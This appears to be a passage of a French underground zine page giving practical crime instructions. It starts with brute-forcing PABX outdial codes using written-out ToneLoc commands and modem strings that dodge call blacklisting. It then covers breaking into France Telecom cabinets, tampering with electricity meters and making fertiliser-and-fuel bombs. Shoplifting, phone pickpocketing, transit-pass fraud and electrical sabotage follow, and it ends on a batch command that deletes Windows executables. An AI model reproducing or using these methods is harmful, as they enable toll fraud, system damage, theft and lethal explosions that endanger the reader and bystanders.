<br>avoir un avoir un numero faites un tour par la VMB. Une fois que vous
avez
<br>trouve un numero de VMB (4150 par exemple), quittez la VMB. Mettez-vous
sur
<br>la tone du PABX puis composez les numeros de poste de 4100 a 4199.
Notez
<br>bien les numeros qui repondent et ceux qui ne repondent pas. La, si
vous
<br>tombez sur un carrier de NITEL, bingo! vous avez trouve la ligne de
<br>telegestion (voir plus loin). Vous trouverez surement des fax, des
modems,
<br>des postes simples, puis peut-etre un poste va vous demander un numero
de
<br>code :) BINGO la ligne d'outdial.
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=$[ 2: COMMENT CASSER LE CODE D'OUTDIAL ]$=-
<p>&nbsp;Plusieurs methodes...
<p>&nbsp;1: La force brute avec un wardialer
<br>&nbsp;2: Les mots de passe par defaut
<br>&nbsp;3: Le Social Enginirimachin :) ou la, comment baiser le mec quoi
;)
<p>** 1 * La force brute avec un wardialer
<br>&nbsp;Bon, avec les wardialers actuels vous ne devez esperer qu'une
fois que
<br>vous avez compose le code ou vous tombez sur une tone sinon le wardialer
<br>sera inefficace. Imaginons que vous vous voulez essayer, voici la ligne
de
<br>commande a utiliser avec ToneLoc.
<p>&nbsp;C:\TONELOC> toneloc xxx.dat /M0800123456,,,,,,,,,0,4147,XXXX
<p>&nbsp;Bon la on compose le 0800 123 456 on attend a peu pres 15 secondes
histoire
<br>que le PABX decroche, puis on compose le 0 pour avoir la tone, puis
<br>composition du numero de poste, puis ToneLoc va essayer un chiffre
entre
<br>0000 et 9999. Un conseil: faites gaffe au timeout et scannez bien pour
des
<br>tones :)
<p>&nbsp;PS: ne venez poa me demander comment on fait marcher Toneloc,
j'en ai marre
<br>de re-expliquer comment ca marche ! Alors tu lis la doc ou NPC-001,
non mais!
<p>&nbsp;PPS: un wardialer va sortir bientot (meme peut etre qu'il sera
deja sorti
<br>au moment ou je vous parle) qui va resoudre le probleme des PABX qui
ont une
<br>ligne d'outdial ou il y'a pas de tone apres avoir compose le numero.
<p>** 2 * Les mots de passe par defaut
<br>&nbsp;On ne va pas repeter ce qui a deja ete dit... Ce sont les memes
partout:
<br>0000, 1111, etc... puis les mots de passe bidons comme 1234, 9876...
<p>&nbsp;C'est-a-dire qu'il faut composer tous les numeros de postes pour
le trouver ?
<br>Huhu, non :). Si vous composez le numero de poste 3XXX et que des que
vous
<br>avez a peine compose 3 ca a raccroche, ben c'est que deja il est pas
dans
<br>les 3XXX. La methode est un peu la meme que celle decrite dans les
autres
<br>articles !
<p>&nbsp;Comment savoir si c'est le poste d'oudial ?
<br>&nbsp;Facile! Si apres avoir compose le numero de poste il ne se passe
rien et
<br>que si vous composez encore genre 10 numeros et que ca sonne soit chez
un mec
<br>mal reveille ou que vous tombez sur la voix de FT qui vous dit que
le numero
<br>est poa atribue, ben vous avez gagne =)
<p>&nbsp;Comment le trouver avec ToneLoc ?
<br>&nbsp;Ok, j'ai compris, vous etes un feignant, et vous voulez pas le
faire a la
<br>main ! Il faut deja savoir dans quelle plage le poste d'outdial peut
se
<br>trouver (4XXX, 5XXX, 8XXX)... C'est le strict minimum !
<br>&nbsp;Ensuite, il vous faut un numero ou vous etes sur qu'un modem
va repondre,
<br>le 0800 44 55 66 par exemple.
<br>&nbsp;Vous n'avez plus qu'a lancer ToneLoc en mode de detection de
carrier:
<p>&nbsp;C:\TONELOC> toneloc xxx.dat /M0800112233,,,,,,,0,4XXX,0800445566
<p>&nbsp;Bon, vous avez tous compris je suppose.
<p>&nbsp;ATTENTION! Cette methode n'est pas du tout conseillee car vous
pouvez etre
<br>sur que le gars du PABX va s'en apercevoir! 1000 appels en une soiree,
<br>ca fait gros :/
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
-=$[ DiVERS ]$=-
<p>&nbsp;Si un jour vous vous promenez dans une entreprise, il est interessant
de programmer un poste pour qu'il transfere les appels (vers une BBS tres
<br>lointaine par ex :)&nbsp; Mais bon, dans le cas ou on a acces a un
poste, il y a tellement de trucs...
<p>&nbsp;Moi, par exemple quand j'en ai marre de scanner a la main un PABX,
je lance ToneLoc en mode speaker ON est hop!, il le fait tres bien a ma
place.
<p>&nbsp;C:\TONELOC> toneloc xxx.dat /M0800998877,,,,,,,0,41XX
<p>&nbsp;Pour tous ceux qui abusent de ToneLoc comme moi, voila une liste
de commandesa faire pour virer les "numeros brules"...
<p>&nbsp;&nbsp; REFERENCE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
CHAINE(s) AT
<br>&nbsp; ----------------------------------------------------------------------
<br>&nbsp;&nbsp; Aceex 1414&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%T1
<br>&nbsp;&nbsp; BOCA-144 ultra&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATX2 ou AT*F
<br>&nbsp;&nbsp; Creatix 144&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT*F ou AT%TCB
<br>&nbsp;&nbsp; Creatix LC VFast&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%TCB
<br>&nbsp;&nbsp; Elsa Mircolink 28800TL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS31=128*W
<br>&nbsp;&nbsp; Escom Data Hawk&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT&amp;A0
<br>&nbsp;&nbsp; Hayes Optima 28.8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%F0&amp;W
<br>&nbsp;&nbsp; Multitech&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT$V4
<br>&nbsp;&nbsp; Novafax 14400 et 28800&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%TCB
<br>&nbsp;&nbsp; Olitec V32Bis et V34&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATX4 (anciens modeles)
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%X2 (nouveaux modeles)
<br>&nbsp;&nbsp; Pearl 1414TVH&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT&amp;F
<br>&nbsp;&nbsp; Telelink IMS-08 Faxline V.32terbo&nbsp;&nbsp; AT%U75
<br>&nbsp;&nbsp; Telejet-2400 Fax SR :&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT*NC99 puis ATZ
<br>&nbsp;&nbsp; TKR Terboline&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT*R0
<br>&nbsp;&nbsp; US Robotics 14400&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS34=192 ; ATS39=1 ; ATS40=1
<br>&nbsp;&nbsp; US Robotics 14400 Sportster&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS40=7 ; ATS40=7
<br>&nbsp;&nbsp; US Robotics Courier DS 14.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS34=192 ATS39=1 ATS40=1
<br>&nbsp;&nbsp; US Robotics DS 16.8 en V.32terbo&nbsp;&nbsp;&nbsp; (brulage
off) ATS40=2&amp;W
<br>&nbsp;&nbsp; Autres US Robotics&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS40=2=20
<br>&nbsp;&nbsp; USR WoldPort&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%TCP
<br>&nbsp;&nbsp; Attel&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT+N8
<br>&nbsp;&nbsp; CPV DeltaFax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT&amp;A0=20
<br>&nbsp;&nbsp; Yoriko 14.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS70=64
<br>&nbsp;&nbsp; Modems a chip Rockwell's&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%TCB
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT$NC000
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT$NC55
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT$NC055
<br>&nbsp;&nbsp; Vrac&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS31=128
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%T1
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%U75
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT%NC99 puis ATZ
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT&amp;D3 + DTR Low
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
AT*R0
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATS70=64 ou ATS70=192
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
ATX2 ou AT*F ou AT%X2
<p>&nbsp;Voila, j'espere vous avoir comble, et si vous avez votre mot a
ajouter ou des remarque a faire contactez-moi... codmik@hotmail.com
<center>
<p><b><font color="#FF0000"><font size=+3>Les bornes France Telecom</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; Les bornes France Telecom que l'on
peut trouver dans la rue sont les chambres de division de cables. Celles-ci
peuvent permettre la connection</font> au t&eacute;l&eacute;phone et donc
de phoner gratos ou d'aller gratos sur le net. Mais attention: il vous
est d&eacute;conseill&eacute; d'essayer de niquer une borne FT car celles-ci
sont sous surveillance. En d&eacute;fon&ccedil;ant les portes de m&eacute;tal
des bornes FT (avec le dessin d'un t&eacute;l&eacute;phone dessus), une
alarme se d&eacute;clanchera dans le central le plus proche. Il se peut
cependant que dans les petites villes, o&ugrave; les bornes FT sont rarement
surveill&eacute;es, il n'y ait pas de syst&egrave;me d'alarme. Il se peut
aussi que le temps que les mecs du central arrivent, un bon bout de temps
se soit pass&eacute;; Comment savoir si une borne FT est sous surveillance.
D'abord sortez de chez vous le soir, avec une cagoule de pr&eacute;f&eacute;rence
pour pas qu'on rep&egrave;re votre visage, piquez des fringues hardos style
blouson en cuir, prenez un pied de biche pour y aller &agrave; la brutalle,
ou des outils pour y aller en douceur. La seconde solution est la mieux
car on vous rep&egrave;rera pas &agrave; 100 lieues &agrave; la ronde.
D&eacute;foncez la borne FT, et allez vous planquer: ouvrez la en grand
et tout hein - pas juste niquer le verrou. Ensuite allez vous planquer
et armez vous de patience: pour &eacute;viter de vous faire chier allez
foutre le bordel dans le quartier voisin en attendant les r&eacute;sultats.
En revenant regardez si quelqu'un &agrave; referm&eacute; ou touch&eacute;
aux portes de la borne. Si oui c'est que la borne &eacute;tait grill&eacute;e,
notez le temps d'intervention: c'est le d&eacute;lai dont vous disposerez
la prochaine fois pour faire vos magouilles. Si personne n'a touch&eacute;
&agrave; rien alors c'est le pied: d&eacute;foncez leurs bornes... Mais
attention: car m&ecirc;me si elle est pas sous surveillance la borne que
vous d&eacute;foncez elle peut-&ecirc;tre grillable.
<center>
<p><b><font color="#FF0000"><font size=+3>Avoir de l'&eacute;lectricit&eacute;
gratos</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; Cette technique est tr&egrave;s risqu&eacute;e:
essayez de remettre en place vos bidouilles avant que le mec qui vienne
relever le compteur arrive et FAITES GAFFE A PAS VOUS FAIRE ELECTROCUTER!</font>
<br><font color="#FFFFFF">Pr&eacute;cautions: achetez vous des gants d'&eacute;lectricien
(gants isolateurs: rien &agrave; craindre pour du 220W), et des tournevis
testeurs. Bon, on va agir sur le compteur: regardez votre compteur &eacute;lectrique:
pour l'ouvrir il y a une vis qui est p&eacute;rc&eacute;e pour permettre
&agrave; un fin ligament tamponn&eacute;e EDF de passer. ce ligament assure
que le compteur n'a jamais &eacute;t&eacute; ouvert. Alors bien sur on
devrait s'arr&ecirc;ter l&agrave;: ben non. Allez d&eacute;couper soigneusement
le ligament sur un autre compteur (c'est facile si vous &ecirc;tes dans
un immeuble), de mani&egrave;re &agrave; ce qu'il soit presque intact.
Ouvrez le compteur EDF, et mettez vos gants!!!</font>
<br><font color="#FFFFFF">Bloquez le compteur d'une mani&egrave;re ou d'une
autre refermez le compteur, soudez les 2 bouts du ligament de l'autre batiment
que vous avez coup&eacute; soigneusement apr&egrave;s l'avoir replac&eacute;
sur la vis!!! Ca y est! Si le boulot est bien fait il devrait y voir que
du feu le mec qui rel&egrave;ve le compteur: mais un compteur bloqu&eacute;
&agrave; un stade de base parait louche nan? Alors faites gaffe.</font>
<br><font color="#FFFFFF">Autre solution: d&eacute;tournez le fil &eacute;l&eacute;cetrique
avant que celui-ci n'arrive au compteur et le d&eacute;vier. Tr&egrave;s
dangereux alors mettez des gants! Mais &ccedil;a c'est tr&egrave;s vite
grill&eacute;!</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Faire des bombes</font></font></b></center>

<p><br>
<p><font color="#FFFFFF">&nbsp;&nbsp; M&eacute;fiez vous: en lisant ceci
personne ne vous oblige &agrave; le faire! A la t&eacute;l&eacute; on vous
dit d'acheter Canard WC et vous le faites pour autant? Non, je crois pas:
alors inutile d'appliquer ce qui va suivre: c'est formellement interdit!!
Pour faire votre petit m&eacute;lange vous aurez besoin d'angrais, et de
charbon. Vous prenez l'engrais et le charbon en proportions &eacute;gales,
vous r&eacute;duisez le tout en poudre, commencez vos exp&eacute;riences
avec d'infimes quantit&eacute;s... Essayez diff&eacute;rents dosages: le
r&eacute;sultat peut en &ecirc;tre meilleur. Rappelez vous que 100gr. de
ce m&eacute;lange vous arrache la main, 200gr. et vous &ecirc;tes mort.
Si vous comprimez ce m&eacute;lange dans une bouteille, la bouteille explose,
dans ce cas c'est des &eacute;clats de verres sur plus de 50 m&egrave;tres.
Conseil pratique: mettez un fond d'essence ou de produit d&eacute;sodorisant
au fond e la bouteille pour en impr&eacute;gner le m&eacute;lange: BADABOUM!
Ca nique absolument tout!</font>
<br><font color="#FFFFFF">Autre bombe &agrave; fabriquer: Un peu d'essence,
des allumes-barbecues, de l'alcool &agrave; 90&deg;, des d&eacute;sodorisants,
un peu de dihydrog&egrave;ne si vous en avez: vous &ecirc;tes mort et vous
faites p&eacute;ter votre immeuble si vous en mettez en grande dose!</font>
<center>
<p><b><font color="#FF0000"><font size=+3>Voler dans les grandes surfaces</font></font></b></center>

<p><br>
<p>&nbsp;&nbsp; Comment se pr&eacute;parer: &eacute;vitez de prendre un
sac &agrave; dos pour stocker ce que vous prendrez, c'est bien trop vite
grill&eacute;, en revanche habillez vous comme ceci:
<br>- t&ecirc;te nue.
<br>- des v&ecirc;tements: pas d'la marque
<br>- pull long descendant en dessous du cul, de couleur fonc&eacute;e
pour passer inaper&ccedil;u.
<br>- pantalon large, avec des poches, une ceinture autour du pantalon:
une vieille ceinture, pantalon non voyant bien sur.
<br>- une paire de ciseaux de cuisine, que la ceinture tiendra et que le
pull cachera.
<br>- un morceau de charbon (pour p&eacute;cho les shoes)
<br>- du liquide
<br>- des chaussures lav&eacute;es, belles, et propres... Il en est de
m&ecirc;me pour les v&ecirc;tements qui doivent &ecirc;tre beaux et repass&eacute;s.
<ul>
<li>
Phase 1: Voler des fringues. Aller dans votre grande surface et assurez
vous de la pr&eacute;sence d'une cabine d'essayage. Ne prenez qu'un seul
fringue (T-Shirt ou pantalon, etc...). Okay vous voil&agrave; avec votre
T-Shirt: &eacute;vitez de prendre un Nike, un t-Shirt beau mais banal qui
se remarque pas. allez dans la cabine d'ssayage: froissez le nouveau t-Shirt,
mettez sur le ceintre l'ancien proprement repass&eacute; au pr&eacute;alable,
et remettez tout &agrave; sa place. Achetez quelque chose pour pas avoir
l'air louche: genre boite de tic-tac et passez par la caisse! Attention:
utilisez la paire de ciseeaux pour retirer les &eacute;tiquettes, vignettes,
dispositif de d&eacute;tection. maintenant une autre m&eacute;thode: celle
du mec qui veut un pur truc de T-Shirt qui d&eacute;chire: prenez 2 T-Shirts
&agrave; essayer, aller dans la cabine, mettez le T-Shirt de marque sous
l'ancien T-Shirt (celui que vous aviez pour venir), remettez votre pulle
par dessus, en prenant soin de retirer ce qui montre que le T-Shirt est
neuf. Okay, laissez un cintre dans la cabine et remettez le second T-Shirt
&agrave; sa place: genre vous arrivez avec quelquechose sur les bras vous
remettez quelque chose &agrave; sa place. Attention aux cam&eacute;ras
de surveillance: ayez l'air cool et relax. Faites la m&ecirc;me chose pour
les pantalons que pour voler un T-Shirt pas d'marque.</li>
</ul>

<ul>
<li>
Phase2: Voler des chaussures. Allez dans les rayons pour chaussures pas
dans les vieilles boutiques pour M&eacute;m&eacute; et P&eacute;p&eacute;
comme Till et autres. Regardez o&ugrave; se trouvent les cam&eacute;ras,
si il y en a pas, le coup est moins risqu&eacute; mais bon: ne tentons
pas le diable. Prenez une paire de chaussures, comme si vous alliez l'acheter
et baladez vous style: j'vais acheter du vin pour ma reum. Allez dans un
coin tranquille (cabine d'essayage avec d'autres fringues sur les bras),
derri&egrave;re les rayons etc...Mettez au pieds votre nouvelle paire de
chaussures, cool elles sont belles: on sort les ciseaux et on nique ce
qui peut nous faire rep&eacute;rer. Okay, on sort le morceau de charbon
et on les salit bien, pas trop... pliez les tordez les, et ayez l'air cool
avec. Vos autres chaussures, les anciennes, vous les remettez en rayon...
Ni vu ni connu... Achetez des tic-tac pour la forme.</li>
</ul>
Astuce: Pour pas paraitre du tout suspect achetez de la viande pour le
chien, du vin pour vous saouler, des l&eacute;gumes pour jeter sur les
voitures... et dites que vous faites les courses pour vos parents.
<center>
<p><b><font color="#FF0000"><font size=+3>Foutre le bordel au niveau de
l'&eacute;lectricit&eacute;</font></font></b></center>

<p><br>
<p>&nbsp;&nbsp; Plusieurs fa&ccedil;ons de faire &ccedil;a: trouver une
borne EDF, buter la borne, prendre un grand seau d'eau et exploser la borne:
risqu&eacute;: &eacute;viter de se faire &eacute;lectrocuter.
<br>Autre m&eacute;thode: casser le filin de t&eacute;moin d'un compteur
&eacute;lectrique: il aura des emmerdes votre voisin!
<br>Autre m&eacute;thode: cacher les capteurs solaires de mani&egrave;re
&agrave; garder tout le temps la lumi&egrave;re de la rue allum&eacute;e.
<br>Autre m&eacute;thode: d&eacute;visser les ampoules mais tr&egrave;s
l&eacute;g&egrave;rement de mani&egrave;re &agrave; ce qu'elles ne s'allument
plus, dans l'ascenseur, les cages d'escalier, etc...
<br>Autre m&eacute;thode: faire p&eacute;ter les fusibles en cr&eacute;ant
une surtension... Mettre en marche une quantit&eacute; &eacute;norme d'appareils
&eacute;lectriques.
<br>C'est un peu d'la merde cet article: mais entre pote c'est heures de
d&eacute;lires garanties.
<center>
<p><b><font color="#FF0000"><font size=+3>Phoner gratos, voyager gratos.</font></font></b></center>

<ul>
<li>
&nbsp;&nbsp; Il y a 2 solutions tr&egrave;s simples pour ce faire. La premi&egrave;re
consiste &agrave; p&eacute;cho le t&eacute;l&eacute;phone portable d'un
mec un peu concon, capable de le laisser dans les poches de son blouson.
Ensuite d&eacute;p&ecirc;chez vous de phoner, jusqu'&agrave; ce que la
plainte ayant &eacute;t&eacute; d&eacute;clar&eacute;e l'abonnement ait
&eacute;t&eacute; annul&eacute;. Donc vous vous retrouvez avec un t&eacute;l&eacute;phone
vide sur les bras. Zut alors... Zut??? pas si sur: si c'est un t&eacute;l&eacute;phone
couramment utilis&eacute; par de nombreuses personnes dans la France enti&egrave;re,
piquez le m&ecirc;me t&eacute;lphone et remplacez le nouveau par l'ancien
dans la poche du type. Le mieux est d'avoir un pote pour bousculer le mec
et que celui-ci se rende compte de rien quand vous lui faites les poches.
Vous pouvez aussi y aller au culot en demandant &agrave; voir le t&eacute;l&eacute;phone
du gars, passez lui l'ancien en attendant et barrez vous avec le nouveau!
tr&egrave;s risqu&eacute;, mais dans un lieu un peu d&eacute;sert c'est
efficace. Autre solution pour phoner gratos: buter les bornes FT (cf: phreaking,
les bornes FT).</li>

<li>
Pour voyager gratos z'avez qu&agrave; p&eacute;cho la carte orange d'un
de vos potes, en y mettant votre photo.</li>
</ul>

<center>
<p><br><b><font color="#FF0000"><font size=+3>Fichiers bat</font></font></b></center>

<p><br>
<p>&nbsp;&nbsp; La cr&eacute;ation de fichiers .bat est simple: il suffit
de s'y connaitre un peu en MS-DOS, et savoir taper sur son clavier. D'abord
quelqes commandes de bases:
<br>echo off : d&eacute;sactive l'affichage de ce qui se passe
<br>dir C:\WINDOWS : affiche le contenu de C:\WINDOWS
<br>del C:\WINDOWS\*.exe : efface tous les fichiers .exe du C:\WINDOWS
<br>echo. : saute une ligne
<br>echo J'&eacute;cris bien hein? : affiche ce qui est &eacute;crit apr&egrave;s
[echo]
<br>cls : efface l'&eacute;cran
<br>pause : demande d'appuyez sur une touche pour continuer
<br>C:\WINDOWS\telnet.exe : &eacute;x&eacute;cute telnet
<br>Donc voici le genre de fichiers .bat extr&egrave;mement dangereux que
vous pouvez faire:
<br><tt>echo off</tt>
<br><tt>echo this programm is created by XXX all rights reserved</tt>
<br><tt>pause</tt>
